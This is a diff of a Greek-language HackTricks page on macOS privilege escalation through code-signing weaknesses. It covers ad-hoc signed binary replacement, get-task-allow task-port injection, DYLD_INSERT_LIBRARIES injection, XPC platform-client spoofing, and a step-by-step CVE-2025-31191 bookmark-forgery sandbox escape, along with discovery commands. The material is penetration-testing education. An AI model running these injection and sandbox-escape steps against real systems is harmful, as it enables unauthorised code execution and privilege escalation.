@@ -6,16 +6,15 @@
 
 ### Βασικές πληροφορίες
 
-Το **Ad-hoc signing** (`CS_ADHOC`) δημιουργεί μια code signature **χωρίς certificate chain** — είναι ένα hash του code χωρίς verification της ταυτότητας developer. Η προέλευση του binary δεν μπορεί να αποδοθεί σε κάποιον developer ή οργανισμό.<sup>[[1]](#references)[[4]](#references)</sup>
+Το **ad-hoc signing** (`CS_ADHOC`) δημιουργεί μια code signature **χωρίς certificate chain**. Εξακολουθεί να υπολογίζει hash του signed code, επομένως το validation μπορεί να εντοπίσει τροποποίηση, αλλά δεν παρέχει developer identity που να μπορεί να γίνει authenticate από άλλο component. Η αντικατάσταση και το re-signing του executable παράγει διαφορετικό CodeDirectory/CDHash.<sup>[[1]](#references)[[4]](#references)</sup>
 
 Σε Mac με Apple Silicon, όλα τα executables απαιτούν τουλάχιστον μια ad-hoc signature. Αυτό σημαίνει ότι θα βρείτε ad-hoc signatures σε πολλά development tools, Homebrew packages και third-party utilities.
 
 ### Γιατί έχει σημασία
 
-- **Καμία επαληθεύσιμη ταυτότητα** — το binary μπορεί να αντικατασταθεί χωρίς να εντοπιστεί από identity-based checks
-- Third-party ad-hoc binaries σε **privileged positions** (FDA, daemon, helpers) αποτελούν στόχους υψηλής προτεραιότητας
-- Σε ορισμένες διαμορφώσεις, οι ad-hoc signatures μπορεί **να μην επαληθεύονται τόσο αυστηρά** όσο ο developer-signed code
-- Ad-hoc signed binaries που έχουν **TCC grants** είναι ιδιαίτερα πολύτιμα — τα grants παραμένουν ακόμη και αν αλλάξει το περιεχόμενο του binary (εξαρτάται από τον τρόπο με τον οποίο το TCC έκανε key το grant)
+- **No verifiable signer identity** — οι έλεγχοι που αποδέχονται μόνο ένα path, ένα ad-hoc status ή ένα unpinned identifier δεν μπορούν να επιβεβαιώσουν ποιος παρήγαγε το binary.
+- Third-party ad-hoc binaries σε **privileged positions** (FDA, daemons, helpers) είναι στόχοι υψηλής προτεραιότητας όταν το αρχείο ή ένας parent directory είναι writable.
+- Ένας CDHash, designated-requirement ή requirement-backed TCC check **εντοπίζει** την αντικατάσταση. Μια path-based policy μπορεί να μην την εντοπίσει· ελέγξτε το actual requirement και επαναλάβετε το test του grant αντί να υποθέσετε ότι παραμένει μετά το re-signing.
 
 ### Discovery
 ```bash
@@ -45,23 +44,23 @@ cp /tmp/malicious-binary /path/to/target
 # 4. Re-sign with ad-hoc signature (mimics the original)
 codesign -s - /path/to/target
 
-# 5. On next launch, the daemon runs your code with the original's TCC grants
-# (This works when TCC keyed the grant by path rather than code signature)
+# 5. Relaunch and verify the effective grant. It survives only when the
+#    authorization is path-based (or otherwise does not pin the old CDHash).
 ```
 ---
 
-## Processes με δυνατότητα debugging (get-task-allow)
+## Debuggable Processes (get-task-allow)
 
 ### Βασικές πληροφορίες
 
-Το **`com.apple.security.get-task-allow`** entitlement (ή το flag **`CS_GET_TASK_ALLOW`**) επιτρέπει σε **οποιοδήποτε process να συνδεθεί ως debugger**, να διαβάσει τη μνήμη, να τροποποιήσει registers, να κάνει code injection και να ελέγξει την εκτέλεση.<sup>[[3]](#references)</sup>
+Το **entitlement `com.apple.security.get-task-allow`** (ή το flag `CS_GET_TASK_ALLOW`) επιτρέπει σε έναν εξουσιοδοτημένο debugger να αποκτήσει το task port της διεργασίας, ακόμη και όταν το Hardened Runtime κανονικά θα το απέτρεπε. Ένας επιτυχημένος debugger μπορεί να διαβάσει τη μνήμη, να τροποποιήσει registers, να κάνει inject κώδικα και να ελέγξει την εκτέλεση.<sup>[[3]](#references)</sup>
 
-Αυτό προορίζεται **μόνο για development builds**. Ωστόσο, ορισμένα third-party binaries αποστέλλονται με αυτό το entitlement σε production.
+Αυτό προορίζεται **μόνο για development builds**. Ωστόσο, ορισμένα third-party binaries διατίθενται με αυτό το entitlement σε production.
 
 > [!CAUTION]
-> Ένα production binary με `get-task-allow` αποτελεί **instant exploitation primitive**. Οποιοδήποτε local process μπορεί να καλέσει το `task_for_pid()`, να αποκτήσει το Mach task port του στόχου και να κάνει inject arbitrary code, το οποίο εκτελείται με τα entitlements, τα TCC grants και το security context του στόχου.
+> Ένα production binary με `get-task-allow` αποτελεί ισχυρό exploitation primitive. Τα `taskgated`, η ταυτότητα του caller, το sandboxing, τα debugger entitlements και η εξουσιοδότηση Developer Tools εξακολουθούν να επηρεάζουν το αν ένας συγκεκριμένος client μπορεί να αποκτήσει το task port. Κάντε δοκιμές τόσο με `lldb`/`debugserver` όσο και με το intended injector. Μόλις το attachment είναι επιτυχές, ο injected κώδικας εκτελείται με τα entitlements, τα TCC grants και το security context του target.
 
-### Ανακάλυψη
+### Discovery
 ```bash
 # Find debuggable binaries
 find /Applications /usr/local -type f -perm +111 -exec sh -c '
@@ -76,7 +75,7 @@ JOIN capabilities c ON ec.capability_id = c.id
 WHERE c.name = 'get_task_allow_signature'
 ORDER BY e.privileged DESC;"
 ```
-### Attack: Task Port Injection
+### Επίθεση: Task Port Injection
 ```c
 #include <mach/mach.h>
 #include <mach/mach_vm.h>
@@ -105,17 +104,17 @@ VM_PROT_READ | VM_PROT_EXECUTE);
 
 ## No Library Validation + DYLD Environment
 
-### Runtime Library-Validation Clearing
+### Εκκαθάριση του Runtime Library Validation
 
-Το private entitlement **`com.apple.private.security.clear-library-validation`** δεν απενεργοποιεί το library validation κατά την εκκίνηση της διεργασίας. Αντίθετα, επιτρέπει στη διεργασία να καλέσει το `csops(..., CS_OPS_CLEAR_LV, ...)` στον εαυτό της κατά το runtime. Στη συνέχεια, το XNU εκκαθαρίζει τα `CS_REQUIRE_LV | CS_FORCED_LV`, υπό την προϋπόθεση ότι ο caller διαθέτει το entitlement και πληροί τους πρόσθετους ελέγχους του handler. Κατά συνέπεια, μια διεργασία μπορεί να γίνει viable library-injection target μόνο αφού φτάσει στο code path που εκκαθαρίζει το library validation.<sup>[[4]](#references)[[5]](#references)</sup>
+Το private entitlement **`com.apple.private.security.clear-library-validation`** δεν απενεργοποιεί το library validation κατά την εκκίνηση της διεργασίας. Αντίθετα, επιτρέπει στη διεργασία να καλέσει το `csops(..., CS_OPS_CLEAR_LV, ...)` στον εαυτό της κατά το runtime. Στη συνέχεια, το XNU εκκαθαρίζει τα `CS_REQUIRE_LV | CS_FORCED_LV`, υπό την προϋπόθεση ότι ο caller διαθέτει το entitlement και ικανοποιεί τους πρόσθετους ελέγχους του handler. Κατά συνέπεια, μια διεργασία μπορεί να γίνει κατάλληλος στόχος για library injection μόνο αφού φτάσει στη διαδρομή κώδικα που εκκαθαρίζει το library validation.<sup>[[4]](#references)[[5]](#references)</sup>
 
-### The Deadly Combination
+### Ο Επικίνδυνος Συνδυασμός
 
 Όταν ένα binary διαθέτει **και τα δύο**:<sup>[[3]](#references)</sup>
 - `com.apple.security.cs.disable-library-validation` (φορτώνει οποιοδήποτε dylib)
 - `com.apple.security.cs.allow-dyld-environment-variables` (δέχεται DYLD env vars)
 
-Αυτό είναι ένα **guaranteed code injection primitive** — το `DYLD_INSERT_LIBRARIES` λειτουργεί άψογα.
+Αυτός είναι ένας συνδυασμός υψηλής αξίας για code injection, επειδή το Hardened Runtime επιτρέπει τόσο το untrusted library όσο και το DYLD environment variable. Το launch context μπορεί και πάλι να κάνει scrub τα DYLD variables (για παράδειγμα, σε protected ή privileged execution paths), επομένως επαληθεύστε την ακριβή invocation αντί να θεωρείτε το ζεύγος των entitlements unconditional.
 
 ### Discovery
 ```bash
@@ -170,21 +169,21 @@ cat /tmp/injected_proof.txt
 ```
 ---
 
-## Προσωρινές εξαιρέσεις του Sandbox
+## Προσωρινές Εξαιρέσεις του Sandbox
 
-### Πώς αποδυναμώνουν το Sandbox
+### Πώς Αποδυναμώνουν το Sandbox
 
 Οι προσωρινές εξαιρέσεις του Sandbox (`com.apple.security.temporary-exception.*`) δημιουργούν κενά στο App Sandbox:<sup>[[2]](#references)</sup>
 
-| Exception | Τι επιτρέπει |
+| Εξαίρεση | Τι επιτρέπει |
 |---|---|
-| `temporary-exception.mach-lookup.global-name` | Σύνδεση σε XPC/Mach services σε επίπεδο ολόκληρου του συστήματος |
+| `temporary-exception.mach-lookup.global-name` | Σύνδεση σε XPC/Mach services σε επίπεδο συστήματος |
 | `temporary-exception.files.absolute-path.read-write` | Ανάγνωση/εγγραφή αρχείων εκτός του app container |
 | `temporary-exception.iokit-user-client-class` | Άνοιγμα συνδέσεων IOKit user-client |
 | `temporary-exception.shared-preference.read-only` | Ανάγνωση των preferences άλλων apps |
 | `temporary-exception.files.home-relative-path.read-write` | Πρόσβαση σε paths σχετικά με το `~` |
 
-### Οι εξαιρέσεις Mach-Lookup = Primitive για Sandbox Escape
+### Mach-Lookup Exceptions = Sandbox Escape Primitive
 
 Η πιο επικίνδυνη εξαίρεση είναι το **mach-lookup** — επιτρέπει σε ένα sandboxed app να επικοινωνεί με privileged daemons:
 ```bash
@@ -200,7 +199,7 @@ echo "[$count exceptions] $(basename "$1")"
 }
 ' _ {} \; 2>/dev/null | sort -rn
 ```
-### Attack: Sandbox Escape via Mach-Lookup
+### Επίθεση: Sandbox Escape μέσω Mach-Lookup
 ```
 1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
 2. Read entitlements to discover mach-lookup exceptions
@@ -213,25 +212,83 @@ c. Fuzz each exposed method
 ```
 ---
 
+## Οι Έλεγχοι Code-Signing Δεν Αποτελούν Ακεραιότητα XPC Client
+
+Μια υπηρεσία XPC μπορεί να πραγματοποιεί authentication μιας σύνδεσης εξάγοντας την κατάσταση code-signing από το audit token και αποδεχόμενη ένα Apple **platform binary** ή έναν client που φέρει τα `CS_REQUIRE_LV`/`CS_FORCED_LV`. Αυτοί οι έλεγχοι περιγράφουν το executable και επιλεγμένα process flags· δεν αποδεικνύουν ότι το τρέχον address space περιέχει μόνο trusted code. Έρευνα σε υπηρεσίες ImageCapture έδειξε ότι ένα injectable Apple binary, όπως το `/bin/ls`, μπορούσε να φορτώσει ένα attacker dylib μέσω του `DYLD_INSERT_LIBRARIES` και στη συνέχεια να συνδεθεί ως platform client. Ένας επακόλουθος έλεγχος για library-validation flags παρακάμφθηκε επίσης, προτού η Apple αλλάξει την υπηρεσία ώστε να απαιτεί το private authorization entitlement της στο macOS 15.<sup>[[6]](#references)</sup>
+
+### Offensive Audit Workflow
+
+1. Κάντε reverse το `listener:shouldAcceptNewConnection:` (ή τον αντίστοιχο low-level XPC handler) και εντοπίστε αποφάσεις που βασίζονται αποκλειστικά στα `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` ή `CS_FORCED_LV`.
+2. Καταγράψτε τους Apple-signed clients που μπορούν να μιλήσουν το protocol και στη συνέχεια ελέγξτε το Hardened Runtime και τα entitlements. Ένα platform signature από μόνο του δεν αποτελεί ένδειξη ότι το DYLD injection έχει αποκλειστεί.
+3. Δοκιμάστε τον υποψήφιο στο **target macOS build**. Αν φορτωθεί ένα constructor dylib, πραγματοποιήστε τη σύνδεση με την υπηρεσία από αυτόν τον constructor, ώστε το audit token να ανήκει στη συγκεκριμένη accepted platform process.
+4. Επαναλάβετε τον έλεγχο κάθε vendor patch: η προσθήκη ενός ακόμη mutable process-status flag στην ίδια authorization decision ενδέχεται να μην εξαλείψει το confused-deputy primitive.
+```bash
+# Static triage of the intended client
+codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
+codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -
+
+# Dynamic check using the constructor dylib created earlier in this page
+DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
+```
+> [!NOTE]
+> Η συμπεριφορά του DYLD, η πολιτική AMFI και οι έλεγχοι στην πλευρά των services αλλάζουν μεταξύ των εκδόσεων του macOS. Η αποτυχία απέναντι σε ένα πλήρως ενημερωμένο host δεν αποδεικνύει ότι η ίδια αλυσίδα απέτυχε στην ευάλωτη έκδοση.
+
+---
+
+## Security-Scoped Bookmark Forgery (CVE-2025-31191)
+
+Τα security-scoped bookmarks διατηρούν την επιλογή αρχείου ενός χρήστη μεταξύ εκκινήσεων. Ένα sandbox extension είναι δεσμευμένο στο boot, επομένως το `ScopedBookmarkAgent` το επικυρώνει και δημιουργεί ένα bookmark με μακροχρόνια ισχύ και authentication μέσω HMAC· όταν η εφαρμογή παρουσιάζει αργότερα αυτό το bookmark, ο agent το επικυρώνει και εκδίδει ένα νέο sandbox extension. Το signing secret αποθηκεύεται στο login keychain και ένα per-app key παράγεται με χρήση του bundle identifier.<sup>[[7]](#references)</sup>
+
+Σε επηρεαζόμενα συστήματα, το keychain ACL εμπόδιζε μια untrusted process από το να **διαβάσει** το secret του `com.apple.scopedbookmarksagent.xpc`, αλλά δεν εμπόδιζε τη διαγραφή του. Μια compromised sandboxed app μπορούσε να αντικαταστήσει το item με ένα γνωστό secret και attacker-controlled ACL, να παράγει το app-specific HMAC key, να πλαστογραφήσει entries στο writable container bookmark plist και να ζητήσει από το `ScopedBookmarkAgent` να τα ανταλλάξει με file-access extensions. Αυτό μετέτρεπε κάθε sandboxed application που χρησιμοποιούσε security-scoped bookmarks σε πιθανό sandbox escape για arbitrary file access, χωρίς πρόσθετη αλληλεπίδραση με file picker. Η Apple διόρθωσε το issue στα security updates της 31ης Μαρτίου 2025.<sup>[[7]](#references)</sup>
+
+### Triage and Attack Chain
+```bash
+APP=/Applications/Target.app
+BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
+"$APP/Contents/Info.plist")"
+
+# Identify apps that can persist app- or document-scoped file access
+codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
+grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'
+
+# Locate app-managed bookmark stores; names and schemas are application-specific
+find "$HOME/Library/Containers" -type f \
+\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null
+
+# Inspect metadata for the agent's generic-password item (normally not its secret)
+security find-generic-password -s com.apple.scopedbookmarksagent.xpc
+```
+Η ακολουθία εκμετάλλευσης σε έναν ευάλωτο host είναι:
+
+1. Αποκτήστε code execution μέσα σε μια sandboxed εφαρμογή που χρησιμοποιεί persistent scoped bookmarks.
+2. Αντικαταστήστε το keychain signing item του agent με ένα γνωστό secret και permissive ACL.
+3. Υπολογίστε το `HMAC-SHA256(key=known_secret, data=bundle_id)` και δημιουργήστε ένα forged bookmark για ένα χρήσιμο path στο writable bookmark store της εφαρμογής.
+4. Ενεργοποιήστε το normal bookmark-resolution path της εφαρμογής, ώστε το `ScopedBookmarkAgent` να επιστρέψει ένα sandbox extension.
+5. Χρησιμοποιήστε τη νέα πρόσβαση σε αρχεία για να αντικαταστήσετε έναν out-of-sandbox execution ή data target που είναι διαθέσιμος σε αυτόν τον user.
+
+Αυτή είναι μια **patched-version technique**: χρησιμοποιήστε την για να κατανοήσετε το trust boundary και να αξιολογήσετε unpatched συστήματα, όχι ως υπόθεση για τις τρέχουσες releases. Για τρέχον testing, εστιάστε στο bookmark parsing, στο identity binding, στο keychain-item lifecycle και στη συμπεριφορά confused-deputy γύρω από τον agent.
+
+---
+
 ## Private Apple Entitlements
 
 ### Τι είναι
 
-Τα entitlements με πρόθεμα `com.apple.private.*` παρέχουν πρόσβαση σε **Apple-internal APIs**, τα οποία δεν είναι τεκμηριωμένα ούτε διαθέσιμα σε third-party developers. Τα third-party binaries με private entitlements τα απέκτησαν μέσω enterprise cert, MDM ή διανομής εκτός App Store.
+Τα entitlements με πρόθεμα `com.apple.private.*` παρέχουν πρόσβαση σε **Apple-internal APIs** που δεν είναι τεκμηριωμένα ή διαθέσιμα σε third-party developers. Third-party binaries με private entitlements τα απέκτησαν μέσω enterprise cert, MDM ή non-App-Store distribution.
 
 ### Επικίνδυνα Private Entitlements
 
-| Entitlement | Δυνατότητα |
+| Entitlement | Capability |
 |---|---|
-| `com.apple.private.tcc.manager` | Πλήρης ανάγνωση/εγγραφή της βάσης δεδομένων TCC |
-| `com.apple.private.tcc.allow` | Πρόσβαση σε συγκεκριμένες υπηρεσίες TCC |
+| `com.apple.private.tcc.manager` | Πλήρες TCC database read/write |
+| `com.apple.private.tcc.allow` | Πρόσβαση σε συγκεκριμένα TCC services |
 | `com.apple.private.security.no-sandbox` | Εκτέλεση χωρίς sandbox |
-| `com.apple.private.iokit` | Απευθείας πρόσβαση σε IOKit drivers |
+| `com.apple.private.iokit` | Άμεση πρόσβαση σε IOKit drivers |
 | `com.apple.private.kernel.\*` | Πρόσβαση σε kernel interfaces |
 | `com.apple.private.xpc.launchd.job-label` | Εγγραφή/διαχείριση launchd jobs |
-| `com.apple.rootless.install` | Εγγραφή σε διαδρομές που προστατεύονται από το SIP |
+| `com.apple.rootless.install` | Εγγραφή σε SIP-protected paths |
 
-### Εντοπισμός
+### Ανακάλυψη
 ```bash
 # Find third-party binaries with private entitlements
 find /Applications /usr/local -type f -perm +111 -exec sh -c '
@@ -254,9 +311,9 @@ ORDER BY privileged DESC;"
 
 ### Τι είναι
 
-Τα Binaries μπορούν να διανέμονται με **προσαρμοσμένα sandbox profiles** γραμμένα σε SBPL (Seatbelt Profile Language). Αυτά τα profiles μπορεί να είναι πιο περιοριστικά Ή **πιο permissive** από το προεπιλεγμένο App Sandbox.
+Τα δυαδικά αρχεία μπορούν να διαθέτουν **προσαρμοσμένα sandbox profiles** γραμμένα σε SBPL (Seatbelt Profile Language). Αυτά τα profiles μπορεί να είναι πιο περιοριστικά Ή **πιο permissive** από το προεπιλεγμένο App Sandbox.
 
-### Έλεγχος προσαρμοσμένων Profiles
+### Auditing Custom Profiles
 ```bash
 # Find custom sandbox profiles
 find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null
@@ -274,13 +331,13 @@ cat /path/to/custom.sb | grep "(allow" | sort -u
 ```
 ---
 
-## Διαδρομές Βιβλιοθηκών με Δυνατότητα Εγγραφής
+## Εγγράψιμες Διαδρομές Βιβλιοθηκών
 
 ### Τι Είναι
 
-Όταν ένα binary φορτώνει μια dynamic library από μια διαδρομή στην οποία ο τρέχων χρήστης μπορεί να κάνει **write**, η βιβλιοθήκη μπορεί να αντικατασταθεί με malicious code.
+Όταν ένα binary φορτώνει μια dynamic library από ένα path στο οποίο ο τρέχων χρήστης μπορεί να **γράψει**, η βιβλιοθήκη μπορεί να αντικατασταθεί με malicious code.
 
-### Ανακάλυψη
+### Discovery
 ```bash
 # Using the scanner — find privileged binaries loading from writable paths
 sqlite3 /tmp/executables.db "
@@ -328,4 +385,6 @@ cp /tmp/evil.dylib /path/to/writable.dylib
 - [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
 - [4] [XNU — `bsd/sys/codesign.h` (λειτουργίες `CS_OPS_*` και `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
 - [5] [XNU — `bsd/kern/kern_proc.c` (handler των `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
+- [6] [Μια νέα εποχή για τα macOS Sandbox Escapes: Διερεύνηση μιας παραγνωρισμένης επιφάνειας επίθεσης και ανακάλυψη 10+ νέων ευπαθειών](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
+- [7] [Ανάλυση του CVE-2025-31191: Ένα macOS Sandbox Escape βασισμένο σε security-scoped bookmarks](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
 {{#include ../../../banners/hacktricks-training.md}}
